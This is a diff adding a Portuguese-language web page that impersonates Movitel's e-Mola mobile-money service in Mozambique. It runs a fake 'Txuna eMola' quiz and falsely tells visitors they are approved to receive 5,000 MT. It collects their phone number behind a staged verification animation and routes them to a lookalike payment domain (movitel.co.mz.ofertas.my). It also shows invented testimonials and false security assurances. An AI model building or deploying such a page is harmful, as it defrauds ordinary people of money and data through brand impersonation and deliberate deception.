@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="description" content="Programa Txuna eMola da Movitel - Quiz para ser selecionado.">
+    <title>Movitel | e-Mola - Txuna eMola</title>
+    <link rel="stylesheet" href="./style.css">
+
+    <!-- Meta Pixel Code -->
+    <script>
+    !function(f,b,e,v,n,t,s)
+    {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+    n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+    if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+    n.queue=[];t=b.createElement(e);t.async=!0;
+    t.src=v;s=b.getElementsByTagName(e)[0];
+    s.parentNode.insertBefore(t,s)}(window, document,'script',
+    'https://connect.facebook.net/en_US/fbevents.js');
+    fbq('init', '1537678944584595');
+    fbq('track', 'PageView');
+    </script>
+    <noscript>
+        <img height="1" width="1" style="display:none"
+        src="https://www.facebook.com/tr?id=1537678944584595&ev=PageView&noscript=1"/>
+    </noscript>
+    <!-- End Meta Pixel Code -->
+
+</head>
+<body>
+
+    <!-- TOP BAR -->
+    <header class="topbar">
+        <div class="topbar-logo">
+            <img src="https://play-lh.googleusercontent.com/itY2znpk1JpsBMQOEo6waC5saDy0uBrwpvefyiJQ6mEJmuEpsx_RiZg6YHE_r2jHV56kRTRXpGHYr81t1xKq=w240-h480-rw" alt="Movitel Logo" class="topbar-logo-img">
+            <div class="logo-text">
+                <span class="logo-movitel">Movitel | e-Mola</span>
+                <span class="logo-sub">TXUNA EMOLA</span>
+            </div>
+        </div>
+        <div class="live-badge" id="topbar-badge">
+            <span class="live-dot"></span>
+            AO VIVO
+        </div>
+    </header>
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-wrapper" id="progress-wrapper" style="display:none;">
+        <div class="progress-label">
+            <span id="progress-text">Pergunta 1 de 4</span>
+            <span id="progress-percent">25%</span>
+        </div>
+        <div class="progress-bar-track">
+            <div class="progress-bar-fill" id="progress-bar-fill" style="width: 25%;"></div>
+        </div>
+    </div>
+
+    <!-- MAIN CONTENT -->
+    <main class="main-content" id="main-content">
+
+        <!-- ===== TELA 1: WELCOME ===== -->
+        <section class="card" id="screen-welcome">
+            <div class="card-top-stripe"></div>
+            <div class="card-body">
+                <div class="welcome-logo">
+                    <img src="https://play-lh.googleusercontent.com/itY2znpk1JpsBMQOEo6waC5saDy0uBrwpvefyiJQ6mEJmuEpsx_RiZg6YHE_r2jHV56kRTRXpGHYr81t1xKq=w240-h480-rw" alt="Movitel eMola Logo" class="welcome-logo-img">
+                </div>
+                <div class="congrats-badge">
+                    <span>🎉</span> PARABÉNS
+                </div>
+                <h1 class="welcome-title">
+                    Você foi <span class="highlight">selecionado!</span>
+                </h1>
+                <p class="welcome-desc">
+                    Estás prestes a ativar o novo serviço da <strong class="brand-orange">Movitel</strong>, o
+                    <strong class="brand-orange">Txuna eMola</strong>, siga as instruções abaixo.
+                </p>
+                <button class="btn-start" id="btn-start" onclick="goToScreen('screen-q1', 1)">
+                    ✦ Começar →
+                </button>
+                <p class="security-note">
+                    <span>🔒</span> 100% seguro · Verificação automática Movitel
+                </p>
+            </div>
+        </section>
+
+        <!-- ===== TELA 2: PERGUNTA 1 ===== -->
+        <section class="card hidden" id="screen-q1">
+            <div class="card-top-stripe"></div>
+            <div class="card-body">
+                <div class="question-header">
+                    <div class="question-number">1</div>
+                    <span class="question-tag">PESQUISA EMOLA</span>
+                </div>
+                <h2 class="question-title">Há quanto tempo você usa o eMola?</h2>
+                <div class="options">
+                    <button class="option-btn" onclick="goToScreen('screen-q2', 2)">
+                        <span class="option-letter">a</span>
+                        <span class="option-text">Há mais de 6 meses</span>
+                    </button>
+                    <button class="option-btn" onclick="goToScreen('screen-q2', 2)">
+                        <span class="option-letter">b</span>
+                        <span class="option-text">Há mais de 1 ano</span>
+                    </button>
+                    <button class="option-btn" onclick="goToScreen('screen-q2', 2)">
+                        <span class="option-letter">c</span>
+                        <span class="option-text">Há mais de 3 anos</span>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== TELA 3: PERGUNTA 2 ===== -->
+        <section class="card hidden" id="screen-q2">
+            <div class="card-top-stripe"></div>
+            <div class="card-body">
+                <div class="question-header">
+                    <div class="question-number">2</div>
+                    <span class="question-tag">PESQUISA EMOLA</span>
+                </div>
+                <h2 class="question-title">Com qual frequência você usa o eMola?</h2>
+                <div class="options">
+                    <button class="option-btn" onclick="goToScreen('screen-q3', 3)">
+                        <span class="option-letter">a</span>
+                        <span class="option-text">Todos os dias</span>
+                    </button>
+                    <button class="option-btn" onclick="goToScreen('screen-q3', 3)">
+                        <span class="option-letter">b</span>
+                        <span class="option-text">Uma vez por semana</span>
+                    </button>
+                    <button class="option-btn" onclick="goToScreen('screen-q3', 3)">
+                        <span class="option-letter">c</span>
+                        <span class="option-text">Uma vez por mês</span>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== TELA 4: PERGUNTA 3 ===== -->
+        <section class="card hidden" id="screen-q3">
+            <div class="card-top-stripe"></div>
+            <div class="card-body">
+                <div class="question-header">
+                    <div class="question-number">3</div>
+                    <span class="question-tag">PESQUISA EMOLA</span>
+                </div>
+                <h2 class="question-title">Você gosta de usar o eMola?</h2>
+                <div class="options">
+                    <button class="option-btn" onclick="goToScreen('screen-q4', 4)">
+                        <span class="option-letter">a</span>
+                        <span class="option-text">Sim</span>
+                    </button>
+                    <button class="option-btn" onclick="goToScreen('screen-q4', 4)">
+                        <span class="option-letter">b</span>
+                        <span class="option-text">Não</span>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== TELA 5: PERGUNTA 4 ===== -->
+        <section class="card hidden" id="screen-q4">
+            <div class="card-top-stripe"></div>
+            <div class="card-body">
+                <div class="question-header">
+                    <div class="question-number">4</div>
+                    <span class="question-tag">PESQUISA EMOLA</span>
+                </div>
+                <h2 class="question-title">Recomendarias a alguém a usar o eMola?</h2>
+                <div class="options">
+                    <button class="option-btn" onclick="goToScreen('screen-phone', 5)">
+                        <span class="option-letter">a</span>
+                        <span class="option-text">Sim</span>
+                    </button>
+                    <button class="option-btn" onclick="goToScreen('screen-phone', 5)">
+                        <span class="option-letter">b</span>
+                        <span class="option-text">Não</span>
+                    </button>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== TELA 6: VERIFICAÇÃO DE ELEGIBILIDADE ===== -->
+        <section class="card hidden" id="screen-phone">
+            <div class="card-top-stripe"></div>
+            <div class="card-body" style="text-align:center;">
+                <div class="phone-icon-circle">
+                    📞
+                </div>
+                <div class="etapa-badge">ETAPA FINAL</div>
+                <h2 class="phone-title">Verificação de Elegibilidade</h2>
+                <p class="phone-desc">
+                    Insira o número da <strong class="brand-orange">Movitel</strong> para que possamos verificar se está elegível
+                    para o sistema <strong class="brand-orange">Txuna eMola</strong>.
+                </p>
+                <div class="phone-input-wrapper">
+                    <div class="phone-prefix">
+                        <span class="flag">MZ</span>
+                        <span class="code">+258</span>
+                    </div>
+                    <input type="tel" id="phone-input" class="phone-input" placeholder="86 000 0000" maxlength="12">
+                </div>
+                <button class="btn-verificar" id="btn-verificar" onclick="startVerification()">
+                    ✓ Verificar
+                </button>
+                <p class="security-note" style="justify-content: center; margin-top: 12px;">
+                    <span>🔒</span> Os seus dados estão protegidos pela Movitel
+                </p>
+            </div>
+        </section>
+
+        <!-- ===== TELA 7: CARREGANDO / VERIFICANDO ===== -->
+        <section class="card hidden" id="screen-loading">
+            <div class="card-top-stripe"></div>
+            <div class="card-body" style="text-align:center;">
+                <div class="loading-circle" id="loading-circle">
+                    <div class="loading-spinner"></div>
+                </div>
+                <h2 class="loading-title">Verificando a sua elegibilidade</h2>
+                <p class="loading-sub">Por favor aguarde, não feche esta página.</p>
+                <div class="loading-steps">
+                    <div class="step-item" id="step-1">
+                        <span class="step-icon step-pending" id="step-icon-1">○</span>
+                        <span class="step-label">Conectando aos servidores Movitel...</span>
+                    </div>
+                    <div class="step-item" id="step-2">
+                        <span class="step-icon step-pending" id="step-icon-2">○</span>
+                        <span class="step-label">Validando número eMola...</span>
+                    </div>
+                    <div class="step-item" id="step-3">
+                        <span class="step-icon step-pending" id="step-icon-3">○</span>
+                        <span class="step-label">Analisando histórico de transações...</span>
+                    </div>
+                    <div class="step-item" id="step-4">
+                        <span class="step-icon step-pending" id="step-icon-4">○</span>
+                        <span class="step-label">Aprovação confirmada ✓</span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- ===== TELA 8: CONTA APROVADA ===== -->
+        <section class="card hidden" id="screen-approved">
+            <div class="card-top-stripe"></div>
+            <div class="card-body" style="text-align:center;">
+                <div class="approved-circle">✓</div>
+                <div class="approved-badge">● CONTA APROVADA</div>
+                <h2 class="approved-title">Parabéns! 🎉</h2>
+                <p class="approved-sub">Número Aprovado para o <strong class="brand-orange">Txuna eMola</strong></p>
+
+                <div class="limit-card">
+                    <p class="limit-label">LIMITE APROVADO PARA RECEBER AGORA</p>
+                    <p class="limit-amount"><span class="limit-currency">MT</span> 5,000<span class="limit-cents">.00</span></p>
+                    <p class="limit-note">↗ Disponível imediatamente</p>
+                </div>
+
+                <div class="cta-section">
+                    <p class="cta-title">Pronto para concluir e receber o Txuna?</p>
+                    <p class="cta-sub">Assista ao vídeo final com as instruções para libertar o Txuna.</p>
+                    <button class="btn-receive" onclick="goToVSL()">
+                        🎁 Receber o Txuna →
+                    </button>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- ===== TELA 9: VSL (VÍDEO) - FORA DO MAIN NORMAL ===== -->
+    <div id="screen-vsl" class="vsl-page hidden">
+
+        <div class="vsl-content">
+            <div class="vsl-header">
+                <h1 class="vsl-title">Assista ao vídeo para <span class="highlight">liberar o seu<br>Txuna</span></h1>
+                <p class="vsl-sub">Veja o vídeo abaixo <strong>até ao fim</strong> para receber <strong class="brand-orange">5,000.00 MT</strong> diretamente no seu eMola.</p>
+            </div>
+
+            <!-- Player de vídeo VSL -->
+            <div class="vsl-video-wrapper" id="vsl-video-wrapper" onclick="vslUnmute()">
+                <video
+                    id="vsl-video"
+                    src="https://res.cloudinary.com/dnwtb991d/video/upload/v1789069878/Movitel_Txuna_eMola_Pesquisa_Remunerada_pu5and.mp4"
+                    playsinline
+                    autoplay
+                    muted
+                    preload="auto">
+                </video>
+
+                <!-- Overlay de som - clique para ativar -->
+                <div class="vsl-sound-overlay" id="vsl-sound-overlay">
+                    <div class="vsl-sound-btn">
+                        <span class="sound-icon">🔇</span>
+                        <span class="sound-text">Clique aqui para ativar o som</span>
+                    </div>
+                </div>
+            </div>
+
+            <!-- CTA: APARECE AUTOMATICAMENTE NO TEMPO DA VSL (1 MINUTO) -->
+            <div class="vsl-cta-box hidden" id="vsl-cta-box" style="display: none !important;">
+                <a href="https://movitel.co.mz.ofertas.my/pay-v2/c177d47f-35f5-490c-87af-78d028540604" class="btn-checkout" id="btn-checkout">
+                    ✓ Verificar Conta e Receber o Txuna →
+                </a>
+                <p class="vsl-cta-note">🔒 Acesso seguro · Verificação automática Movitel</p>
+            </div>
+
+            <!-- COMENTÁRIOS -->
+            <div class="comments-section">
+                <div class="comments-header">
+                    <h3 class="comments-title">Comentários</h3>
+                    <p class="comments-sub">o que outros estão a dizer</p>
+                </div>
+                <p class="comments-count">5 Comentários &nbsp; <span class="comments-sort">Mais relevantes ▾</span></p>
+
+                <div class="comment-item">
+                    <div class="comment-avatar" style="background:#4CAF50;">CM</div>
+                    <div class="comment-body">
+                        <p class="comment-author">Carlos Mabunda <span class="verified">✓</span></p>
+                        <p class="comment-text">Mano, recebi mesmo os 5,000.00 MT no eMola 🙏🙏 nem acreditei quando vi a notificação!</p>
+                    </div>
+                </div>
+
+                <div class="comment-item">
+                    <div class="comment-avatar" style="background:#2196F3;">AS</div>
+                    <div class="comment-body">
+                        <p class="comment-author">Ana Sitoe <span class="verified">✓</span></p>
+                        <p class="comment-text">Funcionou mesmo! Já recebi o meu Txuna. Obrigada Movitel 🎉</p>
+                    </div>
+                </div>
+
+                <div class="comment-item">
+                    <div class="comment-avatar" style="background:#FF9800;">JM</div>
+                    <div class="comment-body">
+                        <p class="comment-author">João Machava</p>
+                        <p class="comment-text">Estava com dúvidas mas tentei e chegou mesmo. O processo é rápido.</p>
+                    </div>
+                </div>
+
+                <div class="comment-item">
+                    <div class="comment-avatar" style="background:#9C27B0;">LN</div>
+                    <div class="comment-body">
+                        <p class="comment-author">Lídia Nuvunga <span class="verified">✓</span></p>
+                        <p class="comment-text">Boa iniciativa da Movitel. Recomendo a toda a gente que tem eMola!</p>
+                    </div>
+                </div>
+
+                <div class="comment-item">
+                    <div class="comment-avatar" style="background:#f07800;">BT</div>
+                    <div class="comment-body">
+                        <p class="comment-author">Bernardo Tembe</p>
+                        <p class="comment-text">Segui os passos todos e o dinheiro chegou no mesmo dia. 👏</p>
+                    </div>
+                </div>
+            </div>
+
+        </div>
+    </div>
+
+    <!-- FOOTER -->
+    <footer class="footer" id="main-footer">
+        <p>© 2026 Movitel · Programa Txuna eMola · Moçambique</p>
+    </footer>
+
+    <script src="./script.js"></script>
+</body>
+</html>
